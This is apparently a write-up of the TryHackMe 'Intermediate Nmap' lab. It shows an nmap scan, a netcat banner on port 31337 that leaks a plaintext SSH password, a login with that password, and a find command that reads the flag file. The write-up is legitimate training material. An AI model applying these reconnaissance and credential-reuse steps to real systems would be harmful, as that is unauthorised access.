# Target
| Category          | Details                                                          |
|-------------------|------------------------------------------------------------------|
| 📝 **Name**       | [Intermediate Nmap](https://tryhackme.com/room/intermediatenmap) |  
| 🏷 **Type**       | THM Challenge                                                    |
| 🖥 **OS**         | Linux                                                            |
| 🎯 **Difficulty** | Easy                                                             |
| 📁 **Tags**       | nmap, netcat                                                     |

# Scan
```
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   3072 7d:dc:eb:90:e4:af:33:d9:9f:0b:21:9a:fc:d5:77:f2 (RSA)
|   256 83:a7:4a:61:ef:93:a3:57:1a:57:38:5c:48:2a:eb:16 (ECDSA)
|_  256 30:bf:ef:94:08:86:07:00:f7:fc:df:e8:ed:fe:07:af (ED25519)
2222/tcp  open  EtherNetIP-1
| ssh-hostkey: 
|   3072 68:9f:59:32:85:43:2d:2f:fe:20:72:55:1b:9a:1a:f6 (RSA)
|   256 57:8d:dc:0e:b4:9d:81:0b:01:89:a8:07:12:51:8d:23 (ECDSA)
|_  256 2a:79:8e:9d:5c:51:0a:43:85:f2:f2:e9:59:2a:58:23 (ED25519)
31337/tcp open  Elite
```

# Solution

#### Access port 31337 with `netcat`
```
┌──(magicrc㉿perun)-[~/attack/THM Intermediate Nmap]
└─$ nc $TARGET 31337        
In case I forget - user:pass
ubuntu:Dafdas!!/str0ng
```
`ubuntu:Dafdas!!/str0ng` credentials has been disclosed. 

#### Use disclosed credentials to access target over SSH on port 2222
```
┌──(magicrc㉿perun)-[~/attack/THM Intermediate Nmap]
└─$ ssh ubuntu@$TARGET -p 2222
ubuntu@10.82.188.217: Permission denied (publickey).
```
Connection has been refused as server accepts only public-key authentication.

#### Use disclosed credentials to access target over SSH on port 22
```
┌──(magicrc㉿perun)-[~/attack/THM Intermediate Nmap]
└─$ ssh ubuntu@$TARGET        
<SNIP>
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
```

#### Search for the flag
```
$ find / -name "flag.txt" -exec sh -c 'echo "{}"; cat "{}"; echo ""' \; 2>/dev/null
/home/user/flag.txt
flag{********************************}
```
